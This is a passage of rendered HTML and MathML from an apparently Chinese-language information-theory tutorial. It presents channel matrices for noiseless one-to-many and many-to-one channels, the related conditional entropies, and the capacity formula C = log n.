fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center center center center center center center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>b</mi><mn>1</mn></msub><mi mathvariant="normal">/</mi><msub><mi>a</mi><mn>1</mn></msub><mo fence="true">)</mo></mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>b</mi><mn>2</mn></msub><mi mathvariant="normal">/</mi><msub><mi>a</mi><mn>1</mn></msub><mo fence="true">)</mo></mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>b</mi><mn>3</mn></msub><mi mathvariant="normal">/</mi><msub><mi>a</mi><mn>1</mn></msub><mo fence="true">)</mo></mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>p</mi><mrow><mo fence="true">(</mo><mrow><msub><mi>b</mi><mn>4</mn></msub><mi mathvariant="normal">/</mi><msub><mi>a</mi><mn>2</mn></msub><mo fence="true">)</mo></mrow></mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>b</mi><mn>5</mn></msub><mi mathvariant="normal">/</mi><msub><mi>a</mi><mn>2</mn></msub><mo fence="true">)</mo></mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>b</mi><mn>6</mn></msub><mi mathvariant="normal">/</mi><msub><mi>a</mi><mn>2</mn></msub><mo fence="true">)</mo></mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>b</mi><mn>7</mn></msub><mi mathvariant="normal">/</mi><msub><mi>a</mi><mn>3</mn></msub><mo fence="true">)</mo></mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>b</mi><mn>8</mn></msub><mi mathvariant="normal">/</mi><msub><mi>a</mi><mn>3</mn></msub><mo fence="true">)</mo></mrow></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><annotation encoding="application/x-tex">\left[ \begin{matrix}p\left( b_1/a_1 \right)&amp; p\left( b_2/a_1 \right)&amp; p\left( b_3/a_1 \right)&amp; 0&amp; 0&amp; 0&amp; 0&amp; 0\\0&amp; 0&amp; 0&amp; p\left( \left. b_4/a_2 \right) \right.&amp; p\left( b_5/a_2 \right)&amp; p\left( b_6/a_2 \right)&amp; 0&amp; 0\\0&amp; 0&amp; 0&amp; 0&amp; 0&amp; 0&amp; p\left( b_7/a_3 \right)&amp; p\left( b_8/a_3 \right)\\\end{matrix} \right]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.6em;vertical-align:-1.55em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.05em;"><span class="pstrut" style="height:5.6em;"></span><span style="width:0.667em;height:3.600em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.667em" height="3.600em" viewBox="0 0 667 3600"><path d="M403 1759 V84 H666 V0 H319 V1759 v0 v1759 h347 v-84H403z M403 1759 V0 H319 V1759 v0 v1759 h84z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">/</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-1.81em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">/</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-1.81em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">/</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-1.81em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="minner"><span class="mopen nulldelimiter"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">/</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mclose nulldelimiter"></span></span></span></span><span style="top:-1.81em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">/</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span><span style="top:-1.81em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">/</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span><span style="top:-1.81em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-1.81em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">7</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">/</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-1.81em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">8</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">/</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.05em;"><span class="pstrut" style="height:5.6em;"></span><span style="width:0.667em;height:3.600em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.667em" height="3.600em" viewBox="0 0 667 3600"><path d="M347 1759 V0 H0 V84 H263 V1759 v0 v1759 H0 v84 H347zM347 1759 V0 H263 V1759 v0 v1759 h84z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><p>那么 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>H</mi><mo stretchy="false">(</mo><mi>X</mi><mi mathvariant="normal">∣</mi><mi>Y</mi><mo stretchy="false">)</mo><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">H(X|Y)=0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span> 但是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>H</mi><mo stretchy="false">(</mo><mi>Y</mi><mi mathvariant="normal">∣</mi><mi>X</mi><mo stretchy="false">)</mo><mo mathvariant="normal">≠</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">H(Y|X)\ne 0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel"><span class="mrel"><span class="mord vbox"><span class="thinbox"><span class="rlap"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="inner"><span class="mord"><span class="mrel"></span></span></span><span class="fix"></span></span></span></span></span><span class="mrel">=</span></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span>，而且 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>H</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo><mo>&lt;</mo><mi>H</mi><mo stretchy="false">(</mo><mi>Y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">H(X)&lt;H(Y)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span></span></span></span></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>C</mi><mo>=</mo><mi>max</mi><mo>⁡</mo><mi>H</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo><mo>=</mo><mi>log</mi><mo>⁡</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">C=\max H(X)=\log n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop">max</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span></span></span></span></span></p><p><strong>无噪声多对一：</strong></p><p>类似于 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mn>1</mn></msub><mo>→</mo><msub><mi>b</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">a_1 \rightarrow b_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mn>2</mn></msub><mo>→</mo><msub><mi>b</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">a_2 \rightarrow b_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，所以信道矩阵如下：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="left left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><annotation encoding="application/x-tex">\left[\begin{array}{lll}1 &amp; 0 &amp; 0 \\1 &amp; 0 &amp; 0 \\0 &amp; 1 &amp; 0 \\0 &amp; 1 &amp; 0 \\0 &amp; 0 &amp; 1\end{array}\right]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:6em;vertical-align:-2.75em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.25em;"><span style="top:-5.25em;"><span class="pstrut" style="height:8em;"></span><span style="width:0.667em;height:6.000em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.667em" height="6.000em" viewBox="0 0 667 6000"><path d="M403 1759 V84 H666 V0 H319 V1759 v2400 v1759 h347 v-84H403z M403 1759 V0 H319 V1759 v2400 v1759 h84z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.75em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-l"><span class="vlist-t 